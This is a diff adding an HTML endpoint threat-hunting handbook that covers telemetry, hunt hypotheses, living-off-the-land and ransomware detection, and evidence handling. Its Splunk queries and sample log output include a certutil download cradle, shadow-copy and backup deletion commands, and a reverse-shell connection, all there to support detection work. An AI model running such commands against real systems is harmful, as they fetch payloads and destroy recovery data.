@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Endpoint Security & Threat Hunting: A Field Handbook</title>
+<style>
+
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Share+Tech+Mono&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&display=swap');
+  :root{
+    --hud:#37d4ff;--hud-dim:rgba(55,212,255,.6);--hud-faint:rgba(55,212,255,.14);
+    --gold:#ffb648;--green:#5ef38c;--red:#ff5d6c;--bg:#02060d;--panel:#070d18;--ink:#dbe7f5;--ink-dim:#8aa0b8;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--ink);font-family:'Newsreader',Georgia,serif;font-size:18px;line-height:1.72;
+    background-image:radial-gradient(1200px 600px at 80% -5%,rgba(55,212,255,.06),transparent 60%);}
+  .mono{font-family:'Share Tech Mono',monospace}
+  ::selection{background:var(--hud);color:#000}
+
+  /* scanline + corners */
+  .scanline{position:fixed;inset:0;z-index:60;pointer-events:none;background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(55,212,255,.018) 3px 4px)}
+  .corner{position:fixed;width:30px;height:30px;border:2px solid var(--hud-faint);z-index:55;pointer-events:none}
+  .corner.tl{top:10px;left:10px;border-right:none;border-bottom:none}
+  .corner.tr{top:10px;right:10px;border-left:none;border-bottom:none}
+  .corner.bl{bottom:10px;left:10px;border-right:none;border-top:none}
+  .corner.br{bottom:10px;right:10px;border-left:none;border-top:none}
+  .progress{position:fixed;top:0;left:0;height:2px;background:var(--hud);box-shadow:0 0 8px var(--hud);z-index:65;width:0}
+
+  .wrap{max-width:880px;margin:0 auto;padding:0 26px}
+
+  /* masthead */
+  header.mast{padding:90px 0 50px;border-bottom:1px solid var(--hud-faint);position:relative}
+  .kicker{font-family:'Share Tech Mono';font-size:12px;letter-spacing:4px;color:var(--gold);text-transform:uppercase}
+  header.mast h1{font-family:'Orbitron';font-weight:900;font-size:clamp(30px,5.4vw,56px);line-height:1.04;
+    letter-spacing:-.5px;margin:18px 0 14px;color:#fff;text-shadow:0 0 24px rgba(55,212,255,.35)}
+  header.mast h1 .c{color:var(--hud)}
+  .standfirst{font-size:20px;color:var(--ink-dim);max-width:62ch;font-style:italic}
+  .byline{font-family:'Share Tech Mono';font-size:12px;color:var(--hud-dim);letter-spacing:1px;margin-top:26px;
+    display:flex;gap:18px;flex-wrap:wrap;align-items:center}
+  .byline .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
+
+  /* TOC */
+  nav.toc{margin:46px 0;padding:24px 28px;border:1px solid var(--hud-faint);background:var(--panel);border-radius:8px}
+  nav.toc h4{font-family:'Share Tech Mono';font-size:12px;letter-spacing:2px;color:var(--hud);margin-bottom:14px}
+  nav.toc ol{list-style:none;counter-reset:s;column-count:2;column-gap:30px}
+  nav.toc li{counter-increment:s;font-family:'Share Tech Mono';font-size:13px;padding:5px 0;break-inside:avoid}
+  nav.toc li::before{content:"0" counter(s) " ";color:var(--hud-dim)}
+  nav.toc a{color:var(--ink-dim);text-decoration:none}
+  nav.toc a:hover{color:var(--hud)}
+  @media(max-width:640px){nav.toc ol{column-count:1}}
+
+  section{padding:48px 0;border-bottom:1px solid rgba(55,212,255,.07)}
+  h2{font-family:'Orbitron';font-weight:700;font-size:clamp(22px,3.4vw,32px);color:#fff;margin-bottom:8px;letter-spacing:-.3px}
+  .h2num{font-family:'Share Tech Mono';font-size:13px;color:var(--hud);letter-spacing:2px;display:block;margin-bottom:6px}
+  h3{font-family:'Orbitron';font-weight:500;font-size:20px;color:var(--hud);margin:30px 0 10px}
+  h4{font-family:'Share Tech Mono';font-size:14px;color:var(--gold);letter-spacing:1px;margin:22px 0 8px;text-transform:uppercase}
+  p{margin:14px 0}
+  a{color:var(--hud)}
+  strong{color:#fff;font-weight:500}
+  em{color:var(--ink)}
+  ul,ol{margin:14px 0 14px 24px}
+  li{margin:7px 0}
+
+  /* terminal block */
+  .term{margin:22px 0;border:1px solid var(--hud-faint);border-radius:8px;overflow:hidden;background:#040a14;
+    box-shadow:0 0 24px -14px var(--hud)}
+  .term-bar{display:flex;align-items:center;gap:7px;padding:9px 14px;background:#081120;border-bottom:1px solid var(--hud-faint)}
+  .term-bar .b{width:11px;height:11px;border-radius:50%}
+  .term-bar .b.r{background:#ff5f56}.term-bar .b.y{background:#ffbd2e}.term-bar .b.g{background:#27c93f}
+  .term-bar .t{font-family:'Share Tech Mono';font-size:11px;color:var(--ink-dim);margin-left:8px;letter-spacing:1px}
+  .term pre{font-family:'Share Tech Mono';font-size:13px;line-height:1.62;color:#cfe8ff;padding:16px 18px;overflow-x:auto;white-space:pre}
+  .term pre .cmd{color:var(--green)}
+  .term pre .pr{color:var(--hud)}
+  .term pre .cmt{color:#5f708c;color:var(--ink-dim)}
+  .term pre .out{color:#a9c4dd}
+  .term pre .ok{color:var(--green)}
+  .term pre .warn{color:var(--gold)}
+  .term pre .bad{color:var(--red)}
+
+  /* callouts */
+  .callout{margin:22px 0;padding:16px 20px;border-left:3px solid var(--hud);background:rgba(55,212,255,.05);border-radius:0 8px 8px 0;font-size:16px}
+  .callout.war{border-left-color:var(--gold);background:rgba(255,182,72,.06)}
+  .callout.danger{border-left-color:var(--red);background:rgba(255,93,108,.06)}
+  .callout .l{font-family:'Share Tech Mono';font-size:11px;letter-spacing:2px;text-transform:uppercase;display:block;margin-bottom:6px}
+  .callout .l.i{color:var(--hud)}.callout.war .l{color:var(--gold)}.callout.danger .l{color:var(--red)}
+
+  /* diagram frame */
+  figure{margin:30px 0;border:1px solid var(--hud-faint);border-radius:10px;background:var(--panel);padding:24px 18px 14px;
+    box-shadow:0 0 30px -18px var(--hud)}
+  figure svg{display:block;width:100%;height:auto}
+  figcaption{font-family:'Share Tech Mono';font-size:11px;color:var(--ink-dim);text-align:center;margin-top:12px;letter-spacing:1px}
+  .svg-label{font-family:'Share Tech Mono';font-size:11px;fill:var(--ink)}
+  .svg-sub{font-family:'Share Tech Mono';font-size:9px;fill:var(--ink-dim)}
+  .svg-title{font-family:'Orbitron';font-size:12px;font-weight:700;fill:#fff}
+
+  /* table */
+  .tbl{margin:22px 0;overflow-x:auto;border:1px solid var(--hud-faint);border-radius:8px}
+  table{border-collapse:collapse;width:100%;font-family:'Share Tech Mono';font-size:13px}
+  th,td{padding:10px 13px;text-align:left;border-bottom:1px solid rgba(55,212,255,.1);vertical-align:top}
+  th{background:#081120;color:var(--hud);letter-spacing:1px;font-weight:400;text-transform:uppercase;font-size:11px}
+  td{color:var(--ink-dim)}
+  tr:hover td{background:rgba(55,212,255,.03);color:var(--ink)}
+  .tag{display:inline-block;font-family:'Share Tech Mono';font-size:10px;padding:2px 7px;border:1px solid var(--hud-faint);border-radius:4px;color:var(--hud);letter-spacing:1px}
+
+  footer{padding:60px 0 80px;text-align:center;font-family:'Share Tech Mono';font-size:12px;color:var(--ink-dim);letter-spacing:1px}
+  footer .c{color:var(--hud)}
+  .rule{height:1px;background:linear-gradient(90deg,transparent,var(--hud-faint),transparent);margin:8px 0}
+
+</style>
+</head>
+<body>
+<a href="index.html" class="backlink">&lt; ALL HANDBOOKS</a>
+<div class="scanline"></div>
+<div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+<div class="progress" id="progress"></div>
+<div class="wrap">
+
+<header class="mast">
+  <span class="kicker">Field Handbook // Endpoint &amp; Hunting</span>
+  <h1>Threat Hunting on the <span class="c">Endpoint</span>, Where the Fight Is Actually Won</h1>
+  <p class="standfirst">Alerts tell you what your tools already know to look for. Hunting finds what they missed. Here is how I run host telemetry, form hunt hypotheses, and chase ransomware and living-off-the-land tradecraft across Linux, macOS, and Windows.</p>
+  <div class="byline"><span class="dot"></span><span>BY IBRAHIM SULTAN</span><span>// CYBERSECURITY ENGINEER</span><span>// ~38 MIN READ</span><span>// REV 2026.06</span></div>
+</header>
+
+<nav class="toc"><h4>&gt; CONTENTS</h4><ol>
+<li><a href="#why">Hunting vs waiting for alerts</a></li>
+<li><a href="#telemetry">The telemetry you need</a></li>
+<li><a href="#hypothesis">Hunt hypothesis templates</a></li>
+<li><a href="#lotl">Living off the land</a></li>
+<li><a href="#ransomware">Ransomware playbook</a></li>
+<li><a href="#evidence">Evidence collection standards</a></li>
+<li><a href="#commands">Cross-platform investigative commands</a></li>
+<li><a href="#program">Building a hunt program</a></li>
+<li><a href="#close">Becoming a hunter</a></li>
+</ol></nav>
+
+<section id="why"><span class="h2num">// 01</span>
+<h2>Hunting versus waiting for alerts</h2>
+<p>Your EDR is good at catching what it has signatures and behavioral models for. The problem is the adversary who does not trip any of them: the one using legitimate admin tools, moving slowly, blending into normal activity. That attacker does not generate an alert. The only way you find them is by going to look, with a hypothesis, in the data. That is hunting.</p>
+<p>The defining feature of a hunt is that it <strong>starts from a hypothesis, not an alert.</strong> "If an attacker were living in our environment using stolen credentials and built-in tools, what trace would they leave, and can I find it?" Then you go look. Sometimes you find evil. Often you find a misconfiguration or a noisy admin instead, and that is still a win because you learned your environment and maybe built a new detection.</p>
+<div class="callout"><span class="l i">The hunter's loop</span>
+Hypothesis, then hunt the data, then one of two outcomes: you find something (escalate to IR), or you do not (turn the hunt into an automated detection so you never have to hunt it by hand again). A hunt that finds nothing should still leave behind a new detection. That is how the program compounds.</div>
+</section>
+
+<section id="telemetry"><span class="h2num">// 02</span>
+<h2>The telemetry you actually need</h2>
+<p>You cannot hunt blind. The non-negotiable host signals are process execution with full command lines and parent-child relationships, network connections tied to processes, file and registry changes, and authentication events. On Windows, that means Sysmon or a real EDR, not just the default event log. On Linux, auditd or eBPF-based tooling. On macOS, the Endpoint Security framework via your EDR.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">linux // confirm auditd is capturing execve (process exec)</span></div>
+<pre><span class="pr">$</span> <span class="cmd">sudo auditctl -l | grep execve</span>
+<span class="out">-a always,exit -F arch=b64 -S execve -k proc_exec</span>
+<span class="pr">$</span> <span class="cmd"># if empty, you are hunting with one eye closed. add it:</span>
+<span class="pr">$</span> <span class="cmd">sudo auditctl -a always,exit -F arch=b64 -S execve -k proc_exec</span>
+<span class="ok">  now logging every process execution with arguments</span></pre></div>
+
+<p>The command line is the crown jewel of endpoint telemetry. The difference between "powershell.exe ran" and "powershell.exe ran with a base64-encoded download cradle" is the entire investigation. If your tooling truncates or drops command-line arguments, fixing that is the highest-value thing you can do before any hunt.</p>
+</section>
+
+<section id="hypothesis"><span class="h2num">// 03</span>
+<h2>Hunt hypothesis templates</h2>
+<p>A good hypothesis is specific enough to query. "Find malware" is not a hypothesis. "An attacker established persistence via a scheduled task that runs a script from a temp directory" is. Here are templates I reuse, framed as fill-in-the-blanks.</p>
+
+<div class="tbl"><table>
+<tr><th>Hunt theme</th><th>Hypothesis shape</th><th>Where to look</th></tr>
+<tr><td>Persistence</td><td>Attacker survives reboot via [autorun mechanism]</td><td>Scheduled tasks, services, run keys, cron, launchd</td></tr>
+<tr><td>Credential access</td><td>Attacker dumped creds from [process/store]</td><td>LSASS access, /etc/shadow reads, keychain access</td></tr>
+<tr><td>Lateral movement</td><td>Attacker moved to [host] via [remote service]</td><td>Remote logons, service creation on remote host</td></tr>
+<tr><td>Defense evasion</td><td>Attacker cleared [log] or disabled [tool]</td><td>Log clears, security service stops, timestomping</td></tr>
+<tr><td>Exfiltration</td><td>Data left via [channel] to [rare destination]</td><td>Large transfers, archives created then sent, DNS tunneling</td></tr>
+</table></div>
+
+<p>Take persistence. The hypothesis is "an attacker created a scheduled task that launches something from a user-writable directory." That is directly queryable.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">windows // scheduled tasks launching from temp/appdata (PowerShell)</span></div>
+<pre><span class="pr">PS&gt;</span> <span class="cmd">Get-ScheduledTask | ForEach-Object {
+  $a = $_.Actions.Execute
+  if ($a -match 'Temp|AppData|ProgramData\\[^\\]+\.(exe|ps1|vbs)') {
+    [pscustomobject]@{ Task=$_.TaskName; Runs=$a; Author=$_.Author }
+  }
+}</span>
+<span class="out">Task            Runs                              Author</span>
+<span class="bad">UpdaterSvc      C:\Users\jdoe\AppData\..\s.ps1     N/A</span>
+<span class="cmt"># a task named to look benign, running a script from a user dir,</span>
+<span class="cmt"># with no author. that is worth pulling the thread on.</span></pre></div>
+</section>
+
+<section id="lotl"><span class="h2num">// 04</span>
+<h2>Living off the land</h2>
+<p>The hardest adversary to catch uses your own tools against you: PowerShell, WMI, certutil, rundll32 on Windows; bash, curl, ssh, cron on Linux. Nothing they run is malware. The signal is in <em>how</em> the legitimate tool is used: certutil downloading a file, rundll32 with a weird export, a shell with a network connection to a rare host.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">windows // certutil used as a download cradle (a classic LOLBin)</span></div>
+<pre><span class="pr">spl&gt;</span> <span class="cmd">index=endpoint process_name=certutil.exe
+  (process="*urlcache*" OR process="*-f http*" OR process="*decode*")
+| table _time host user process</span>
+<span class="out">_time        host       user    process</span>
+<span class="bad">06-01 14:22  WS-FIN-04  jdoe    certutil -urlcache -f http://x/p.exe p.exe</span>
+<span class="cmt"># certutil is a cert tool. nobody legit uses it to fetch an exe.</span></pre></div>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">linux // a shell with an outbound connection to a rare host</span></div>
+<pre><span class="pr">$</span> <span class="cmd">sudo ss -tnp | awk '/bash|sh|python|nc/ {print}'</span>
+<span class="out">ESTAB 0 0 10.0.4.9:51234 198.51.100.7:4444 users:(("bash",pid=8821))</span>
+<span class="bad"># a bash process with an ESTABLISHED connection to :4444</span>
+<span class="bad"># to an external IP. that smells like a reverse shell.</span>
+<span class="pr">$</span> <span class="cmd">sudo ls -la /proc/8821/exe /proc/8821/cwd  # pivot to investigate</span></pre></div>
+
+<div class="callout war"><span class="l">Baseline first</span>
+Living-off-the-land hunting drowns you in false positives unless you know what normal looks like. Your admins use PowerShell and ssh constantly. Spend time learning the baseline (which accounts, which hosts, which patterns are routine) so the genuinely odd thing stands out. The hunt is really an anomaly search against a baseline you have to build first.</div>
+</section>
+
+<section id="ransomware"><span class="h2num">// 05</span>
+<h2>Ransomware playbook</h2>
+<p>Ransomware is the incident every endpoint team will eventually face. By the time files are encrypting, you are already late; the goal is to catch the activity in the window between initial access and detonation, which is often hours or days. The behavioral tells before encryption: mass enumeration of file shares, deletion of shadow copies and backups, disabling of security tools, and staging of an archive for exfil (modern ransomware steals before it encrypts).</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">windows // shadow-copy deletion, a near-universal pre-encryption step</span></div>
+<pre><span class="pr">spl&gt;</span> <span class="cmd">index=endpoint (process="*vssadmin* delete shadows*"
+  OR process="*wmic* shadowcopy delete*"
+  OR process="*wbadmin* delete catalog*"
+  OR process="*bcdedit* recoveryenabled no*")
+| table _time host user process</span>
+<span class="out">_time        host      user    process</span>
+<span class="bad">06-01 02:11  SRV-FILE  SYSTEM  vssadmin.exe delete shadows /all /quiet</span>
+<span class="cmt"># this is the moment to act. backups are being destroyed</span>
+<span class="cmt"># so recovery is impossible. isolate the host NOW.</span></pre></div>
+
+<p>When you confirm ransomware activity, the response order matters. <strong>Isolate first, investigate second.</strong> Pull the host off the network (logically, keep it powered for memory forensics if you can), because every minute it stays connected is more files encrypted and more lateral spread. Then preserve evidence, identify patient zero, and scope the blast radius before you even think about recovery.</p>
+
+<div class="callout danger"><span class="l">Do not reboot</span>
+The instinct to reboot a ransomware host is wrong. Encryption keys, injected code, and the attacker's tooling may live only in memory. A reboot destroys that evidence and can also trigger encryption routines waiting on restart. Isolate the network, preserve memory, then proceed. And never pay before exhausting backups and engaging the right legal and IR channels; that is a decision for leadership, not the SOC.</div>
+
+<h3>Modern ransomware steals before it encrypts</h3>
+<p>One thing has changed about ransomware that reshapes how you respond to it: encryption is now often the last act, not the first. The dominant model is double extortion, where the crew exfiltrates a large volume of your data over days or weeks, and only then encrypts, so they can demand payment both to decrypt and to not publish what they took. This matters enormously for your response, because it means that by the time you see encryption, a data breach has very likely already happened, and "we restored from backups" does not make the stolen data come back.</p>
+<p>So the hunt shifts upstream. The encryption is loud and late; the valuable detection window is the quiet staging and exfiltration that preceded it. Look for the signs of bulk collection and outbound transfer that ransomware crews leave during their dwell time: large archives suddenly appearing, especially split into volumes, unusual volumes of data moving to cloud storage or a rare external host, and the use of legitimate transfer tools in places they have never run before.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">hunt the staging that precedes encryption, not just the encryption</span></div>
+<pre><span class="pr">$</span> <span class="cmd"># large archive files created recently, a classic staging tell</span>
+<span class="pr">$</span> <span class="cmd">find / -type f \( -name "*.7z" -o -name "*.zip" -o -name "*.rar" \) \
+  -size +500M -mtime -3 2>/dev/null -exec ls -lh {} \;</span>
+<span class="bad">-rw-r--r-- 1 svc www 2.3G /tmp/.cache/bk01.7z   </span><span class="cmt"># hidden dir, huge, 2 days old</span>
+<span class="pr">$</span> <span class="cmd"># and unusual outbound volume by host (netflow / proxy)</span>
+<span class="pr">spl&gt;</span> <span class="cmd">index=netflow | stats sum(bytes_out) AS out BY src_host
+       | where out &gt; 10000000000 | sort -out</span>
+<span class="bad">SRV-FILE-02   847 GB outbound in 24h   </span><span class="cmt"># a file server should not do this</span></pre></div>
+
+<div class="callout war"><span class="l">It is a breach the moment data leaves</span>
+Treat confirmed exfiltration as a reportable data breach in its own right, separate from the encryption event, because legally and practically it usually is. The notification clock, the regulatory obligations, and the legal exposure attach to the data leaving, not to the files being locked. Backups solve the availability problem. They do nothing for the confidentiality one. Get legal involved the moment you see signs of bulk exfiltration, not after the ransom note appears.</div>
+</section>
+
+<section id="evidence"><span class="h2num">// 06</span>
+<h2>Evidence collection standards</h2>
+<p>If an incident might end up in court, in an insurance claim, or in a regulator's inbox, how you collect evidence matters as much as what you collect. Order of volatility governs the sequence: grab the most ephemeral data first. Memory before disk, network state before logs, because memory and live connections vanish the moment the machine changes state.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">linux // collect volatile evidence in the right order, with hashes</span></div>
+<pre><span class="pr">$</span> <span class="cmd"># 1. memory first (most volatile), to external, write-once media</span>
+<span class="pr">$</span> <span class="cmd">sudo avml /mnt/eviddrive/$(hostname)-mem-$(date +%s).lime</span>
+<span class="pr">$</span> <span class="cmd"># 2. live network + process state</span>
+<span class="pr">$</span> <span class="cmd">sudo ss -tunap > /mnt/eviddrive/connections.txt</span>
+<span class="pr">$</span> <span class="cmd">ps auxww > /mnt/eviddrive/processes.txt</span>
+<span class="pr">$</span> <span class="cmd"># 3. hash EVERYTHING for chain of custody</span>
+<span class="pr">$</span> <span class="cmd">sha256sum /mnt/eviddrive/* > /mnt/eviddrive/MANIFEST.sha256</span>
+<span class="ok">  evidence captured, hashed, timestamped</span>
+<span class="pr">$</span> <span class="cmd"># record who, what, when, where in a custody log alongside it</span></pre></div>
+
+<div class="callout"><span class="l i">Chain of custody is a habit, not a tool</span>
+Hash everything at collection, log who touched it and when, store it on write-once or access-controlled media, and never work on originals (work on verified copies). You may never need it in court, but if you do and you skipped this, the evidence is worthless. Build the habit on every incident so it is automatic when it counts.</div>
+</section>
+
+<section id="commands"><span class="h2num">// 07</span>
+<h2>Cross-platform investigative quick reference</h2>
+<p>The same investigative questions, answered on each OS. When you land on an unfamiliar host mid-incident, these are the first things you ask: what is running, what is talking to the network, what persists across reboot, and who logged in.</p>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">what is running + what is on the network</span></div>
+<pre><span class="cmt"># LINUX</span>
+<span class="pr">$</span> <span class="cmd">ps auxww --sort=-%cpu | head</span>            <span class="cmt"># processes</span>
+<span class="pr">$</span> <span class="cmd">sudo ss -tunap</span>                          <span class="cmt"># connections+pids</span>
+<span class="pr">$</span> <span class="cmd">sudo lsof -i -nP</span>                         <span class="cmt"># open network files</span>
+
+<span class="cmt"># MACOS</span>
+<span class="pr">$</span> <span class="cmd">ps -axo pid,ppid,user,comm | head</span>
+<span class="pr">$</span> <span class="cmd">sudo lsof -i -nP</span>
+<span class="pr">$</span> <span class="cmd">log show --predicate 'eventType==logEvent' --last 1h</span>
+
+<span class="cmt"># WINDOWS (PowerShell)</span>
+<span class="pr">PS&gt;</span> <span class="cmd">Get-Process | Sort CPU -Desc | Select -First 10</span>
+<span class="pr">PS&gt;</span> <span class="cmd">Get-NetTCPConnection -State Established |</span>
+     <span class="cmd">  Select LocalAddress,RemoteAddress,OwningProcess</span></pre></div>
+
+<div class="term"><div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">what persists across reboot + who logged in</span></div>
+<pre><span class="cmt"># LINUX</span>
+<span class="pr">$</span> <span class="cmd">sudo crontab -l; ls -la /etc/cron.*; systemctl list-timers</span>
+<span class="pr">$</span> <span class="cmd">last -aF | head; sudo grep -i accepted /var/log/auth.log</span>
+
+<span class="cmt"># MACOS</span>
+<span class="pr">$</span> <span class="cmd">ls -la ~/Library/LaunchAgents /Library/Launch*</span>
+<span class="pr">$</span> <span class="cmd">last | head</span>
+
+<span class="cmt"># WINDOWS (PowerShell)</span>
+<span class="pr">PS&gt;</span> <span class="cmd">Get-ScheduledTask | ? State -ne Disabled</span>
+<span class="pr">PS&gt;</span> <span class="cmd">Get-CimInstance Win32_StartupCommand</span>
+<span class="pr">PS&gt;</span> <span class="cmd">Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -Max 20</span></pre></div>
+
+<div class="callout war"><span class="l">Authorized systems only</span>
+Run these on systems you own or are explicitly authorized to investigate. Investigative commands on machines you do not have authority over can itself be unlawful, no matter how good the intent. When in doubt, get written authorization first.</div>
+</section>
+
+<section id="program"><span class="h2num">// 08</span>
+<h2>Building a hunt program, not just doing hunts</h2>
+<p>A single good hunt is a nice afternoon. A hunt program is what actually moves your security posture, and the difference is structure. Without it, hunting becomes a thing one talented person does when they have spare time, which means it stops the moment they are busy or they leave. With it, hunting is a repeatable cadence that compounds whether or not any individual is having a good week.</p>
+<p>The backbone is a simple loop run on a schedule: pick a focus from your threat model, form specific hypotheses, hunt them, document what you found and what you did not, and convert anything repeatable into an automated detection so you never hunt it by hand again. That last step is the flywheel. Every hunt either finds something (which becomes an incident) or finds nothing (which becomes a detection that watches for it forever). Either way the program gets stronger, and your manual hunting time keeps moving to fresh ground instead of re-checking old ground.</p>
+
+<figure><svg viewBox="0 0 820 150" xmlns="http://www.w3.org/2000/svg">
+<defs><style>.pb{fill:#070d18;stroke:#37d4ff;stroke-width:1.2;rx:7}.pl{font-family:'Orbitron';font-size:11px;font-weight:700;fill:#fff}.psx{font-family:'Share Tech Mono';font-size:8px;fill:#8aa0b8}.pf{stroke:#37d4ff;stroke-width:1.2;fill:none;opacity:.6;marker-end:url(#pa)}</style>
+<marker id="pa" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#37d4ff"/></marker></defs>
+<rect class="pb" x="14" y="50" width="120" height="46" rx="7"/><text class="pl" x="74" y="71" text-anchor="middle">PICK</text><text class="psx" x="74" y="87" text-anchor="middle">threat-model focus</text>
+<rect class="pb" x="164" y="50" width="120" height="46" rx="7"/><text class="pl" x="224" y="71" text-anchor="middle">HUNT</text><text class="psx" x="224" y="87" text-anchor="middle">test hypotheses</text>
+<rect class="pb" x="314" y="50" width="130" height="46" rx="7"/><text class="pl" x="379" y="71" text-anchor="middle">DOCUMENT</text><text class="psx" x="379" y="87" text-anchor="middle">found / not found</text>
+<rect class="pb" x="474" y="50" width="150" height="46" rx="7"/><text class="pl" x="549" y="71" text-anchor="middle">AUTOMATE</text><text class="psx" x="549" y="87" text-anchor="middle">hunt to detection</text>
+<rect class="pb" x="654" y="50" width="120" height="46" rx="7"/><text class="pl" x="714" y="71" text-anchor="middle">REPEAT</text><text class="psx" x="714" y="87" text-anchor="middle">fresh ground</text>
+<path class="pf" d="M134,73 L162,73"/><path class="pf" d="M284,73 L312,73"/><path class="pf" d="M444,73 L472,73"/><path class="pf" d="M624,73 L652,73"/>
+</svg><figcaption>FIG.02: The hunt-program flywheel. The automate step is what makes the program compound instead of repeating itself.</figcaption></figure>
+
+<h3>Prioritize hunts by what would actually hurt</h3>
+<p>You cannot hunt everything, so let your threat model drive the queue. If you are a hospital, ransomware and data theft top the list. If you are a defense supplier, it is patient nation-state persistence. Pick the techniques your most likely adversaries actually use against organizations like yours, and hunt those first. The point of a threat-informed program is to spend your limited hunting hours where a real attacker is most likely to be, not on whatever technique you read about last week.</p>
+
+<div class="callout"><span class="l i">Write it down even when you find nothing</span>
+The most undervalued artifact in hunting is the record of a hunt that found nothing. It tells the next person this ground was already checked, when, and how, so they do not waste time repeating it, and it documents your coverage for anyone who asks what you are watching for. "We hunted for this and found it clean on this date" is a genuinely useful sentence. Treat the documentation as part of the deliverable, not an afterthought, or your program will keep re-hunting the same ground and forgetting it did.</div>
+</section>
+
+<section id="close"><span class="h2num">// 09</span>
+<h2>Becoming a hunter</h2>
+<p>The shift from analyst to hunter is the shift from reacting to alerts to proactively asking questions of your data. It is a muscle you build: pick a technique, form a hypothesis, go look, and whether or not you find evil, leave behind a detection so the next time it is automatic. Do that every week and within a year your coverage and your instincts both compound.</p>
+<p>The adversary is already assuming they can hide in your tools and your noise. Hunting is how you prove them wrong. Go look.</p>
+<div class="rule"></div>
+<p class="mono" style="color:var(--ink-dim);font-size:14px;margin-top:24px">// Pairs with: the detection engineering handbook (turn your hunts into detections) and the Zero Trust handbook (the device posture signals that feed both).</p>
+</section>
+
+<footer><div class="rule"></div>
+<p style="margin-top:24px"><span class="c">[</span> FIELD HANDBOOK // ENDPOINT &amp; HUNTING <span class="c">]</span> &middot; WRITTEN BY IBRAHIM SULTAN &middot; <span class="c">STAY CURIOUS, STAY PATCHED</span></p>
+<p style="margin-top:8px;opacity:.6">Defensive guidance. Investigate only authorized systems. Preserve evidence properly. Not legal advice.</p></footer>
+
+</div>
+<script>
+addEventListener('scroll',()=>{const h=document.documentElement;
+  document.getElementById('progress').style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight)*100)+'%';},{passive:true});
+</script>
+</body>
+</html>
